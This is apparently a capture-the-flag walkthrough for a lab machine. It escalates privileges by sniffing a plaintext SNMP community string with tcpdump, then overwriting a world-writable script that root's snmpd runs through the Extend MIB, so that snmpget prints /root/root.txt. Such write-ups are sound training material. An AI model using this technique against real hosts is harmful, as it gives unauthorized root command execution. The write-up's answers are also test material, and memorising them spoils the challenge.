# Keep it simple

## Question 1
Start the machine, connect to 10.10.X.X using SSH an log in.


## Question 2
First off lets see if there is anything interesting in the home directory;

    [monitor@simple ~]$ ls
    todo.txt

Better read this todo file;

    [monitor@simple ~]$ cat todo.txt
    The simple service should be running already!

    To do list:

    1 - Check the disk monitoring is working e.g

    'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."checkDisk"'
    
    2 - Also confirm with Dev team if they want camel, snake or kebab case this week (lol) and standardise the OID formats!


Ok so seems like some network monitoring development is underway on this host and a service called 'simple' is up and running.

Lets look into that service first;

    [monitor@simple ~]$ systemctl | grep simple
    simple.service                                                                           loaded active running   simple.ser                                       vice

    [monitor@simple ~]$ systemctl status simple.service
    ● simple.service
       Loaded: loaded (/etc/systemd/system/simple.service; enabled; vendor preset: disabled)
       Active: active (running) since Fri 2023-12-01 12:09:00 GMT; 13min ago
     Main PID: 646 (simple.server.s)
       CGroup: /system.slice/simple.service
               ├─ 646 /bin/bash /usr/local/bin/simple.server.sh
               └─1828 sleep 5

So, a script is being run but we have no idea what that is doing;

    [monitor@simple ~]$ cat /usr/local/bin/simple.server.sh
    cat: /usr/local/bin/simple.server.sh: Permission denied


Next lets look at the two tasks in the "to do" list

Looking at the hint in todo list task 1 we can also see that SNMP is being used and in particular the Extend MIB which "defines a framework for scripted extensions for the Net-SNMP agent" (quote from http://www.net-snmp.org/docs/mibs/)

Time to research the SNMP Extend MIB and find out what it's all about.  Here is a great primer from RedHat;

https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending

We have now learned that as well as reporting on the usual system and networking metrics SNMP can also be extentded to run custom scripts!

Looking at todo list task 2 we can get the idea that script names used here have not been standardised.  Don't know what that means but we can keep this in mind for later.

As we now know from todo list task 1 & our own research we now know the answer to task 2!

## Question 3
How to get that root flag?

Let's see if an SNMP server is running on our host;

    [monitor@simple ~]$ ss -tunnelp
    Netid  State      Recv-Q Send-Q                                 Local Address:Port                                                Peer Address:Port
    udp    UNCONN     0      0                                                  *:68                                                             *:*                   ino:17694 sk:ffff8f6d7a381980 <->
    udp    UNCONN     0      0                                          127.0.0.1:161                                                            *:*                   ino:18752 sk:ffff8f6d7a381dc0 <->
    udp    UNCONN     0      0                                          127.0.0.1:323                                                            *:*                   ino:15366 sk:ffff8f6d7a380cc0 <->
    udp    UNCONN     0      0                                              [::1]:323                                                         [::]:*                   ino:15367 sk:ffff8f6d779fc000 v6only:1 <->
    tcp    LISTEN     0      128                                                *:22                                                             *:*                   ino:18595 sk:ffff8f6d77b8c000 <->
    tcp    LISTEN     0      128                                        127.0.0.1:199                                                            *:*                   ino:18753 sk:ffff8f6d77b8c7c0 <->
    tcp    LISTEN     0      128                                             [::]:22                                                          [::]:*                   ino:18604 sk:ffff8f6d77b90000 v6only:1 <->

Yep!  We can also see that SNMP is running as root - oops :-D

    [monitor@simple ~]$ ps -ef | grep snmp
    root      1024     1  0 12:09 ?        00:00:01 /usr/sbin/snmpd -LS0-6d -f

Can't read the SNMP conf file :-(

    [monitor@simple ~]$ cat /etc/snmp/snmpd.conf
    cat: /etc/snmp/snmpd.conf: Permission denied


Lets see if we can see any SNMP traffic hitting our host - time to fire up tcpdump! We can use "-i any" switch to pick up traffic from all available interfaces;

    [monitor@simple ~]$ tcpdump -nn udp and port 161 -i any 
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
    12:29:57.498885 IP 127.0.0.1.43754 > 127.0.0.1.161:  C="******" GetRequest(28)  .1.3.6.1.2.1.1.5.0
    12:29:57.503196 IP 127.0.0.1.161 > 127.0.0.1.43754:  C="******" GetResponse(34)  .1.3.6.1.2.1.1.5.0="simple"
    12:30:02.524673 IP 127.0.0.1.56841 > 127.0.0.1.161:  C="******" GetRequest(28)  .1.3.6.1.2.1.1.5.0
    3 packets captured
    6 packets received by filter
    0 packets dropped by kernel

Yay! We can see SNMP requests and replies on the loopback interface! Looks like an older version (i.e. 1 or 2c) is being used to we can see the SNMP data - including the community
in plain text!

So let's recap what we now know;

* SNMP server is running as root on the loopback interface
* The SNMP community is "******"
* Some dev work is ongoing using the SNMP Extend MIB - which we now know from research can run shell scripts or other external programs
* The todo file tells us a script called checkDisk is under development

Let's try and run checkDisk!

    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."checkDisk"'
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."checkDisk" = STRING: 42%

Seems easy enough, lets find that script!

Lets start looking for file called something like "checkDisk"

    [monitor@simple ~]$ find / -type f -name checkDisk* 2>/dev/null
    [monitor@simple ~]$

Nothing!

Let's be less specific;

    find / -type f -name check* 2>/dev/null" 

The /usr/local/bin/monitoring/ folder looks right.  

Time for a closer look;

    [monitor@simple ~]$ ls -al /usr/local/bin/monitoring/
    total 20
    drwxr-xr-x. 2 root root 116 Sep  6 12:44 .
    drwxr-xr-x. 3 root root  48 Dec  1 10:04 ..
    -rw-r--r--. 1 root root  11 Sep  6 08:24 check_disk.sh
    -rw-r--r--. 1 root root   8 Sep  6 08:39 check_interface.sh
    -rw-r--r--. 1 root root   8 Sep  6 08:40 check_mem.sh
    -rw-r--rw-. 1 root root  12 Sep  6 12:44 check_temp.sh
    -rw-r--r--. 1 root root   8 Sep  6 08:39 check_users.sh

Interesting - one of these files we can edit!!!  I wonder if we can run check_temp.sh from SNMP (as root!) and spawn a shell or run commands?

Lets try running it first in the same fashion as checkDisk;

    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."checkTemp"'
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."checkTemp" = No Such Instance currently exists at this OID

No dice!  

Recall from task 2 in the todo file that there was some inconsistency in OID formats and 3 formats mentioned;

1. camelCase   <------ worked Ok for check_disk.sh but not for check_temp.sh
2. snake_case
3. kebab-case

Let's try snake case;

    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check_temp"'
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check_temp" = No Such Instance currently exists at this OID

Thats not it. Let's try kebab case;

    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"'
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp" = STRING: 37.5

We have found a way to run check_temp.sh so let's use it to grab the root flag!

    [monitor@simple ~]$ echo "cat /root/root.txt" > /usr/local/bin/monitoring/check_temp.sh
    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"'
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp" = STRING: *************************



Thanks for reading!
